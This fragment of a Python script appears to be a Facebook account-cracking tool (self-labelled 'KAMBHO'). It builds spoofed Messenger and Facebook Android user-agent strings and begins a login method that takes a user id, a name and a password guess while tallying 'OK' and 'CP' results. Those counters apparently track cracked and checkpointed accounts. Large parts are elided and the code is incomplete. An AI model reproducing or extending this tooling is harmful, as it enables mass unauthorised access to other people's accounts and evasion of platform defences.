...
#method 1
uk1 = "Dalvik/2.1.0 (Linux; U; Android 6.0.1; LS-4508 Build/MMB29M) [FBAN/Orca-Android;FBAV/427.0.0.0.4;FBPN/com.facebook.orca;FBLC/en_US;FBBV/314805577;FBCR/null;FBMF/Jio;FBBD/Jio;FBDV/LS-4508;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;] FBBK/1"


uk2 = "Dalvik/2.1.0 (Linux; U; Android 10; NEON_RAY_PRO Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/427.0.0.0.4;FBPN/com.facebook.orca;FBLC/en_US;FBBV/314805577;FBCR/null;FBMF/Safaricom;FBBD/Safaricom;FBDV/QP1A.190711.020;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;] FBBK/1"
...
def generate_user_agent():
    fbav_version = "FBAV/" + ".".join(str(random.randint(0, 99)) for _ in range(4))
    fbsv_version = "FBSV/" + ".".join(str(random.randint(0, 9)) for _ in range(3))

    user_agent = (
        f"FBAN/FB4A;{fbav_version};FBBV/{random.randint(10000000, 99999999)};"
        f"FBDM/{{density={random.uniform(1.0, 3.0):.1f},width={random.randint(720, 1440)},height={random.randint(1280, 2560)}}};"
        f"FBLC/{random.choice(['en_US', 'en_GB', 'es_ES', 'fr_FR'])};FBCR/{random.choice(['Verizon', 'AT&T', 'T-Mobile'])};"
        f"FBMF/{random.choice(['Samsung', 'LG', 'Google', 'OnePlus'])};FBBD/{random.choice(['Samsung', 'LG', 'Google', 'OnePlus'])};"
        f"FBPN/com.instagram.android;FBDV/{random.choice(['Galaxy S9', 'Pixel 4', 'OnePlus 7T'])};{fbsv_version};"
        f"nullFBCA/{random.choice(['armeabi-v7a', 'armeabi', 'arm64-v8a'])}:{random.choice(['armeabi-v7a', 'armeabi', 'arm64-v8a'])};"
    )
...
def uav():
    ...
    uaa1 = "Davik/2.1.0 (Linux; U; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020) [FBAN/{fban};FBAV/{fbav};FBPN/{fbpn};FBLC/en_GB;FBBV/{fbbv};FBCR/{network_carriers};FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"
    ...
    uaa2 = "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/{fban2};FBAV/{fbav2};FBPN/{fbpn2};FBLC/{fblc2};FBBV/{fbbv2};FBCR/{network_carriers2};FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/{fbsv2};FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1;]"
    ...
    uaa3 = "Davik/2.1.0 (Linux; U; Android 10; SHG01 Build/S1180) [FBAN/{fban3};FBAV/{fbav3};FBPN/{fbpn3};FBLC/{fblc3};FBBV/{fbbv3};FBCR/{network_carriers3};FBMF/SHARP;FBBD/KDDI;FBDV/SHG01;FBSV/{fbsv3};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=1024,width=2048};]"
...
def iAmMethod1Ua():
	...
	END = "[FBAN/Orca-Android;FBAV/424.0.0.25.113;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/314805577;FBCR/null;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;] FBBK/1"
...
class iAmMain:
	...
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [KAMBHO] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
